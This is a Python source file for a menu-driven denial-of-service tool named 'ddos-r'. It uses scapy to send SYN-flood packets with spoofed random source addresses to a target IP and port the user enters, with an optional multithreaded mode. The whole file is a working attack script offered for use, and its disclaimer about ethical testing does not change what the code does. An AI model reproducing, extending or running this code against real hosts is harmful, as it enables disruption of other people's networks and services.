#ddos-r version 1.0.0
import os
import random
import threading

import scapy.all
from scapy.layers.inet import IP, TCP

#cool ascii art :3
print(r"▓█████▄ ▓█████▄  ▒█████    ██████          ██▀███  "+"\n"
      r"▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒         ▓██ ▒ ██▒"+"\n"
      r"░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   ░▒▓█▓▒░ ▓██ ░▄█ ▒"+"\n"
      r"░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒        ▒██▀▀█▄  "+"\n"
      r"░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒        ░██▓ ▒██▒"+"\n"
      r" ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░        ░ ▒▓ ░▒▓░"+"\n"
      r" ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░          ░▒ ░ ▒░"+"\n"
      r" ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░            ░░   ░ "+"\n"
      r"   ░       ░        ░ ░        ░    version 1.0.0"+"\n"
      r"a dead simple distributed denial-of-service tool"+"\n"
      r"by WIL_FU_"+"\n"
      r"in case you skids didn't get the memo, this is for ETHICAL PURPOSES ONLY"+"\n"
      "ONLY USE ON SYSTEMS YOU HAVE BEEN GIVEN EXPLICIT PERMISSION TO TEST ON")
attackTypes = ["SYN FLOOD", "ICMP FLOOD", "UDP FLOOD"]
input("strike any key to continue")
def random_ip():
    #generates a random IPv4 address, literally just any 4 numbers between 0 and 255, with some dots
    return ".".join(map(str, (random.randint(0,255)for _ in range(4))))
#made this a seperate function for multithreaded attacks:
def send_syn_packet(ip, port, packets):
    total = 0
    for x in range(0, int(packets)):
        s_port = random.randint(1000,9000)
        seq = random.randint(1000,9000)
        window = random.randint(1000,9000)
        IP_packet = IP()
        IP_packet.src = random_ip()
        IP_packet.dst = ip

        #creating SYN packet, random port, random amount of data, everything randomized
        TCP_packet = TCP()
        TCP_packet.sport = s_port
        TCP_packet.dport = int(port)
        TCP_packet.seq = seq
        TCP_packet.flags = "S"
        TCP_packet.window = window
        #packets will be created and sent until amount of packets reached
        scapy.all.send(IP_packet/TCP_packet, verbose=1)
        #total packets sent increments, will be printed at the end of the attack, literally only used for that purpose
        total += 1
        os.system("clear")
        print("[*] SYN FLOOD BEGIN")
        s = "-----" + "SYN FLOOD" + "-----"
        outputAsListItem("", s)
        outputAsListItem(f"IP ADDRESS (DESTINATION): {IP_packet.dst}", s)
        outputAsListItem(f"TCP PORT (DESTINATION): {TCP_packet.dport}", s)
        outputAsListItem(f"IP ADDRESS ('SENT FROM'): {IP_packet.src}", s)
        outputAsListItem(f"TCP PORT ('SENT FROM'): {TCP_packet.sport}", s)
        closeList(s)
        print("[*] PACKETS SENT: " + str(total))
def syn_flood():
    ip=input("ENTER IP ADDRESS: ")
    os.system("clear")
    s = "-----" + "SYN FLOOD CONFIG" + "-----"
    print(s)
    outputAsListItem("", s)
    outputAsListItem(f"IP ADDRESS: {ip}", s)
    outputAsListItem("PORT: ", s)
    closeList(s)
    port=input("ENTER PORT: ")
    os.system("clear")
    print(s)
    outputAsListItem("", s)
    outputAsListItem(f"IP ADDRESS: {ip}", s)
    outputAsListItem(f"PORT: {port}", s)
    closeList(s)
    packets = input("ENTER AMOUNT OF PACKETS: ")
    os.system("clear")
    isMultithreaded = input("ENTER 1 FOR MULTITHREADED ATTACK (ALLOWS MULTIPLE ATTACKS TO RUN CONCURRENTLY), OR 0 FOR NORMAL ATTACK: ")
    if int(isMultithreaded) == 0:
        os.system("clear")
        print("[*] SYN FLOOD BEGIN")
        send_syn_packet(ip, int(port), int(packets))
        print("[*] SYN FLOOD END")
    elif int(isMultithreaded) == 1:
        threadCount = int(input("ENTER THREAD COUNT: "))
        PORTrANDOMIZED = input("ENTER 1 FOR RANDOMIZED PORTS, OR 0 TO FLOOD CHOSEN PORT ONLY: ")
        os.system("clear")
        threads = []
        for x in range(0, threadCount):
            if int(PORTrANDOMIZED) == 1:
                thread = threading.Thread(target=send_syn_packet, args=(ip, random.randint(1, 1000), int(packets)))
            else:
                thread = threading.Thread(target=send_syn_packet, args=(ip, int(port), int(packets)))
            threads.append(thread)
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        #for x in range(0, threadCount):
        #    threadVarName = f"thread{str(x)}"
        #    exec(f"{threadVarName} = {threading.Thread(target=send_syn_packet, args=(ip,random.randint(1,1000),int(packets)))}")
        #print("[*] SYN FLOOD BEGIN")
        #for x in range(0, threadCount):
        #    threadVarName = f"thread{str(x)}"
        #    exec(f"{threadVarName}.start()")
        #for x in range(0, threadCount):
        #    threadVarName = f"thread{str(x)}"
        #    exec(f"{threadVarName}.join()")
        print("[*] SYN FLOOD END")
    #flooding chosen port of chosen IP with SYN packets until the victim's connection shits itself
    send_syn_packet(ip, int(port), int(packets))

def attack_type():
    os.system("clear")
    print("----ATTACK MENU----")
    print("|                 |")
    print("| [1]-SYN_FLOOD_  |")
    print("| MORE 2 COME     |")
    print("|                 |")
    print("-------------------")
    n=input("CHOOSE YOUR DESIRED ATTACK: ")
    try:
        n=int(n)
        return n
    except ValueError:
        print("INVALID NUMBER")
        quit(1)
def outputAsListItem(str, header):
    ss = "| " + str
    while len(ss) < len(header):
        ss = ss + " "
    ss = ss + "|"
    print(ss)
def closeList(header):
    ss = "|"
    end = "-"
    while len(ss) < len(header):
        ss = ss + " "
        end = end + "-"
    ss = ss + "|"
    end = end + "-"
    print(ss)
    print(end)
def attack_setup(attacktype):
    os.system("clear")
    s = "-----" + attackTypes[attacktype-1] + " CONFIG" + "-----"
    print(s)
    if attackTypes[attacktype - 1] == "SYN FLOOD":
        outputAsListItem("", s)
        outputAsListItem("IP ADDRESS: ", s)
        outputAsListItem("PORT: ", s)
        closeList(s)
        syn_flood()
#program begin
attack_setup(attack_type())